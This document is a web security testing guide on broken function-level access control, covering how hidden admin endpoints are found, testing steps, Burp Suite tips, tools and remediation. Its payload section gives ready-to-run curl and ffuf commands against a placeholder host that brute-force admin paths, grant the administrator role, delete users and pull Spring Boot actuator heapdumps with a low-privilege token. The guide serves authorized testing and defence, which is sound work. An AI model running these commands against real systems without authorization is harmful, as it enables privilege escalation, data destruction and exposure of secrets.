# Broken Function-Level Access Control

## Overview
Broken function-level access control occurs when an application fails to restrict access to specific functions or endpoints based on the user's role or privilege level. While object-level controls verify "can this user access this record," function-level controls verify "can this user call this function at all." Attackers discover hidden administrative endpoints, API functions, or backend operations that are not linked from the UI but remain accessible if directly requested. This vulnerability consistently ranks in the OWASP Top 10 as part of Broken Access Control.

## How It Works
- The application implements role-based access control (RBAC) visually — hiding admin links from regular users — but does not enforce the restriction server-side.
- Attackers discover administrative or privileged endpoints through source code, JavaScript bundles, API documentation (Swagger, OpenAPI), error messages, or directory/path brute forcing.
- The server-side handler for the endpoint checks authentication (is the user logged in?) but not authorization (is this user allowed to call this function?).
- Common patterns: admin endpoints under `/admin/`, management APIs under `/api/admin/` or `/api/v1/manage/`, debug/diagnostic endpoints, batch operation endpoints, user management functions.

## Impact
- Administrative takeover — access user management, system configuration, or security settings.
- Mass data access — invoke bulk export functions not exposed to regular users.
- Privilege escalation — call role-assignment functions to elevate own account.
- Data destruction — call batch delete functions.
- Application compromise — modify application settings, inject backdoors.

## Where to Look
- JavaScript source files and bundles — search for URL strings referencing admin paths.
- API specification files: `/swagger.json`, `/openapi.yaml`, `/api-docs`, `/api/v1/docs`.
- HTML source comments with developer notes about admin URLs.
- Robots.txt for disallowed admin paths.
- Network traffic during admin user session (if accessible) vs. regular user session.
- Common admin path patterns: `/admin`, `/administrator`, `/manage`, `/management`, `/api/admin`, `/api/v1/admin`, `/internal`, `/debug`, `/actuator` (Spring Boot).
- HTTP methods not exposed in the UI: PUT, DELETE, PATCH on endpoints that only show GET in the interface.
- GraphQL: `__schema` introspection to discover all available mutations and queries.

## Testing Steps
1. Map the application as a regular user: note all visible endpoints and functions.
2. Extract all JavaScript files and search for URL paths, especially those with `admin`, `manage`, `internal`, `delete`, `create`, `grant`, `revoke`.
3. Check `/swagger.json`, `/openapi.yaml`, `/api-docs`, and similar API documentation endpoints — these often expose the complete API surface.
4. Check `robots.txt` and `sitemap.xml` for administrative paths.
5. Use a content discovery tool against known admin path patterns.
6. As a regular authenticated user, directly request admin endpoint paths captured from source/docs.
7. Test all HTTP methods (GET, POST, PUT, DELETE, PATCH) on endpoints that only appear to use one method.
8. Compare the response: 403 = endpoint exists but access denied (correct); 200/201 = access granted (vulnerable); 404 = endpoint doesn't exist.
9. Check Spring Boot Actuator endpoints: `/actuator/env`, `/actuator/beans`, `/actuator/heapdump`.

## Payloads / Techniques

Discover admin endpoints from JS source:
```bash
# Download all JS files
curl -s https://target.com | grep -oE 'src="[^"]+\.js"' | \
  awk -F'"' '{print $2}' | while read f; do
    curl -s "https://target.com$f" >> /tmp/all_js.txt
  done

# Search for API paths
grep -oE '"/[a-zA-Z0-9_/-]+"' /tmp/all_js.txt | sort -u
grep -iE 'admin|manage|internal|delete|grant|role|user.*creat' /tmp/all_js.txt
```

Directory brute force for admin endpoints:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt:FUZZ \
  -u https://target.com/FUZZ \
  -H "Authorization: Bearer $USER_TOKEN" \
  -fc 404 -mc 200,201,204,301,302,403

# Admin-specific wordlist
ffuf -w /usr/share/seclists/Discovery/Web-Content/common-admin-paths.txt:FUZZ \
  -u https://target.com/FUZZ \
  -H "Authorization: Bearer $USER_TOKEN" \
  -mc all -fc 404
```

Test admin API endpoints with regular user token:
```bash
USER_TOKEN="regular_user_jwt_token"

# User management
curl https://target.com/api/admin/users \
  -H "Authorization: Bearer $USER_TOKEN"

# Role assignment
curl -X POST https://target.com/api/admin/users/42/role \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"administrator"}'

# System configuration
curl https://target.com/api/admin/config \
  -H "Authorization: Bearer $USER_TOKEN"

# User deletion
curl -X DELETE https://target.com/api/admin/users/10 \
  -H "Authorization: Bearer $USER_TOKEN"
```

Test Spring Boot Actuator endpoints:
```bash
for endpoint in env beans heapdump threaddump mappings loggers metrics info; do
  echo "Testing /actuator/$endpoint:"
  curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $USER_TOKEN" \
    "https://target.com/actuator/$endpoint"
  echo
done
```

Test HTTP method escalation:
```bash
# Endpoint visible as GET only in the UI
# Test other methods
for method in GET POST PUT DELETE PATCH OPTIONS; do
  echo -n "$method /api/users/42: "
  curl -s -X $method https://target.com/api/users/42 \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"role":"admin"}' \
    -o /dev/null -w "%{http_code}\n"
done
```

Check OpenAPI for undocumented endpoints:
```bash
curl https://target.com/api/docs/swagger.json | python3 -m json.tool | grep '"path"'
curl https://target.com/openapi.yaml
curl https://target.com/api-docs
curl https://target.com/v3/api-docs
```

## Burp Suite Tips
- Use **Content Discovery** (Engagement Tools → Discover Content) to brute-force paths from the application's root while authenticated as a regular user.
- The **Autorize** extension is essential — configure the admin user's session and regular user's session, then browse the application as admin. Autorize replays every request with the regular user's token and flags any that return the same or similar response (indicating missing function-level access control).
- In **Proxy**, filter by status code to focus on 200 responses to endpoints that a regular user shouldn't access.
- Use **Intruder** with an admin path wordlist against the base URL while authenticated as a regular user.
- Check the **Site Map** for any paths captured during admin session browsing that are structurally different from the regular user's paths.
- The **JS Link Finder** extension extracts all URLs from JavaScript files automatically.

## Tools
- **Autorize** (Burp Extension) — Automated function-level access control testing.
- **ffuf** — Fast directory/endpoint brute forcing with auth tokens.
- **Gobuster** — Directory discovery with authentication support.
- **Feroxbuster** — Recursive content discovery.
- **OWASP ZAP** — Force Browse feature for discovering hidden endpoints.
- **LinkFinder** — Extracts URLs from JavaScript files.

## Remediation
- Implement server-side role checks at the function/endpoint level — never rely on hiding UI elements.
- Use a centralized authorization framework (e.g., Spring Security, Casbin, Open Policy Agent) that enforces function-level access control consistently.
- Deny by default: any function not explicitly authorized for a role should return `403 Forbidden`.
- Audit all API endpoints against a role matrix: document which roles are allowed to call which endpoints, and enforce this with automated tests.
- Disable development/debug endpoints (actuator, diagnostics, swagger) in production, or require admin authentication to access them.
- Use middleware to enforce role requirements on routes rather than ad-hoc checks inside individual handler functions.
- Perform automated access control regression testing: run the test suite with low-privilege accounts and verify no admin functions are accessible.

## References
https://owasp.org/Top10/A01_2021-Broken_Access_Control/
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema
https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/285.html
https://portswigger.net/web-security/access-control
